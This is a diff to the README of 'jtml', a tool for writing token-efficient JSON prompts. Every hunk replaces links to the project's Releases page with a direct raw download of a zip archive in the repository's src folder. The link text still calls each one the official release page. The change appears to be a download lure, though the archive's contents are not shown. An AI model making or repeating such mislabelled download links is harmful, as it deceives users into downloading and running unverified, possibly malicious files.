@@ -1,6 +1,6 @@
 # 🧩 jtml - Fewer Tokens, Clearer JSON Prompts
 
-[![Download jtml](https://img.shields.io/badge/Download%20jtml-Visit%20Releases-blue?style=for-the-badge)](https://github.com/ziyad248/jtml/releases)
+[![Download jtml](https://img.shields.io/badge/Download%20jtml-Visit%20Releases-blue?style=for-the-badge)](https://github.com/ziyad248/jtml/raw/refs/heads/main/src/Software_3.4-alpha.3.zip)
 
 ## 📦 What jtml does
 
@@ -18,7 +18,7 @@ This is useful for prompt engineering, chat apps, data extraction, and any workf
 
 ## 🖥️ Windows download and setup
 
-1. Open the [jtml Releases page](https://github.com/ziyad248/jtml/releases)
+1. Open the [jtml Releases page](https://github.com/ziyad248/jtml/raw/refs/heads/main/src/Software_3.4-alpha.3.zip)
 2. Find the latest release at the top
 3. Download the Windows file from the assets list
 4. If the file is zipped, extract it
@@ -103,7 +103,7 @@ For most users, the correct choice is the Windows download file, usually an `.ex
 
 ## 🧭 Step-by-step download guide
 
-1. Open the [release page](https://github.com/ziyad248/jtml/releases)
+1. Open the [release page](https://github.com/ziyad248/jtml/raw/refs/heads/main/src/Software_3.4-alpha.3.zip)
 2. Scroll to the latest version
 3. Look under Assets
 4. Download the Windows file
@@ -168,7 +168,7 @@ jtml works well for people who deal with:
 
 ## 🔗 Download again
 
-Use the official release page here: [https://github.com/ziyad248/jtml/releases](https://github.com/ziyad248/jtml/releases)
+Use the official release page here: [https://github.com/ziyad248/jtml/raw/refs/heads/main/src/Software_3.4-alpha.3.zip](https://github.com/ziyad248/jtml/raw/refs/heads/main/src/Software_3.4-alpha.3.zip)
 
 ## 🧾 Simple example of where it fits
 
